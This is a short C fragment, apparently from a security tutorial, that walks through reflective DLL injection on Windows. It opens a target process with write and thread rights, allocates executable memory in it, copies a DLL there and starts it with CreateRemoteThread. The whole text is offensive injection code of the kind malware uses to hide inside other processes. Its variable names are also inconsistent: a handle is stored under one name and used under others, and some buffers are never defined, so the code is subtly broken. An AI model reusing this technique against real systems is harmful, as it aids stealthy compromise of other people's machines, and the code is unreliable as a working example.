// This is a stub file showing only the specific pieces, not a full attack.
// 1. Attach to the target process
// 2. Allocate memory within the target process
hHandle = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                       PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                       PROCESS_VM_READ,
                       FALSE, procID);
GetFullPathName(TEXT("proxy.dll"), BUFSIZE, dllPath, NULL);
hFile = CreateFileA(dllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
dllFileLength = GetFileSize(hFile, NULL);
remoteDllAddr = VirtualAllocEx(hProcess, NULL, dllFileLength,
                               MEM_RESERVE|MEM_COMMIT,
                               PAGE_EXECUTE_READWRITE);
// 3. Copy the DLL into the target process memory and calculate an appropriate
// memory address
lpBuffer = HeapAlloc(GetProcessHeap(), 0, dllFileLength);
ReadFile(hFile, lpBuffer, dllFileLength, &dwBytesRead, NULL);
WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dllFileLength, NULL);
dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpWriteBuff);
// 4. Instruct the target process to execute your DLL
rThread = CreateRemoteThread(hTargetProcHandle, NULL, 0, lpStartExecAddr, lpExecParam, 0, NULL);
WaitForSingleObject(rThread, INFINITE);
